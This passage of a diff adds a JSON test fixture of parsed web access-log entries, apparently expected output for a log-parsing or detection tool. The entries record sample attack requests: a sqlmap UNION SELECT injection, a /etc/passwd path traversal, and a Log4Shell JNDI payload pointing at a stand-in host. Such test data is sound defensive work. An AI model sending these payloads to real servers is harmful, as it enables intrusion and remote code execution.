+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /products?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1\" 404 475 \"-\" \"sqlmap/1.7 (https://sqlmap.org)\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/products?id=1%27%20UNION%20SELECT%201,2--",
+    "status": 404,
+    "user_agent": "sqlmap/1.7 (https://sqlmap.org)"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"DELETE /api/orders/1 HTTP/1.1\" 405 541 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 541,
+    "method": "DELETE",
+    "path": "/api/orders/1",
+    "status": 405,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET / HTTP/1.1\" 200 10956 \"-\" \"${jndi:ldap://203.0.113.9/a}\"",
+   "fields": {
+    "bytes": 10956,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "${jndi:ldap://203.0.113.9/a}"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"GET /q HTTP/1.1\" 404 475 \"-\" \"agent with \\\"quotes\\\"\"",
+   "fields": {
+    "bytes": 475,
+    "method": "GET",
+    "path": "/q",
+    "status": 404,
+    "user_agent": "agent with \"quotes\""
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T19:00:00Z",
+   "last_at": "2026-10-31T19:00:00Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:19:00:00 +0000] \"POST /login HTTP/1.1\" 404 475 \"-\" \"curl/8.18.0\"",
+   "fields": {
+    "bytes": 475,
+    "method": "POST",
+    "path": "/login",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  }
+ ],
+ "testdata/web/nginx.access.log": [
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET / HTTP/1.1\" 200 615 \"-\" \"curl/8.18.0\" \"-\"",
+   "fields": {
+    "bytes": 615,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET /index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted] HTTP/1.1\" 200 615 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\" \"-\"",
+   "fields": {
+    "bytes": 615,
+    "method": "GET",
+    "path": "/index.html?utm_source=x\u0026token=[redacted]\u0026email=[redacted]",
+    "status": 200,
+    "user_agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET /wp-login.php HTTP/1.1\" 404 153 \"-\" \"curl/8.18.0\" \"-\"",
+   "fields": {
+    "bytes": 153,
+    "method": "GET",
+    "path": "/wp-login.php",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET /..%2f..%2fetc/passwd HTTP/1.1\" 400 157 \"-\" \"-\" \"-\"",
+   "fields": {
+    "bytes": 157,
+    "method": "GET",
+    "path": "/..%2f..%2fetc/passwd",
+    "status": 400
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET /products?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1\" 404 153 \"-\" \"sqlmap/1.7 (https://sqlmap.org)\" \"-\"",
+   "fields": {
+    "bytes": 153,
+    "method": "GET",
+    "path": "/products?id=1%27%20UNION%20SELECT%201,2--",
+    "status": 404,
+    "user_agent": "sqlmap/1.7 (https://sqlmap.org)"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"DELETE /api/orders/1 HTTP/1.1\" 405 157 \"-\" \"curl/8.18.0\" \"-\"",
+   "fields": {
+    "bytes": 157,
+    "method": "DELETE",
+    "path": "/api/orders/1",
+    "status": 405,
+    "user_agent": "curl/8.18.0"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET / HTTP/1.1\" 200 615 \"-\" \"${jndi:ldap://203.0.113.9/a}\" \"-\"",
+   "fields": {
+    "bytes": 615,
+    "method": "GET",
+    "path": "/",
+    "status": 200,
+    "user_agent": "${jndi:ldap://203.0.113.9/a}"
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"GET /q HTTP/1.1\" 404 153 \"-\" \"agent with \\x22quotes\\x22\" \"-\"",
+   "fields": {
+    "bytes": 153,
+    "method": "GET",
+    "path": "/q",
+    "status": 404,
+    "user_agent": "agent with \"quotes\""
+   }
+  },
+  {
+   "source": "web",
+   "kind": "http_request",
+   "first_at": "2026-10-31T18:59:45Z",
+   "last_at": "2026-10-31T18:59:45Z",
+   "count": 1,
+   "src_ip": "172.17.0.1",
+   "message": "172.17.0.1 - - [31/Oct/2026:18:59:45 +0000] \"POST /login HTTP/1.1\" 404 153 \"-\" \"curl/8.18.0\" \"-\"",
+   "fields": {
+    "bytes": 153,
+    "method": "POST",
+    "path": "/login",
+    "status": 404,
+    "user_agent": "curl/8.18.0"
+   }
+  }
+ ]
+}
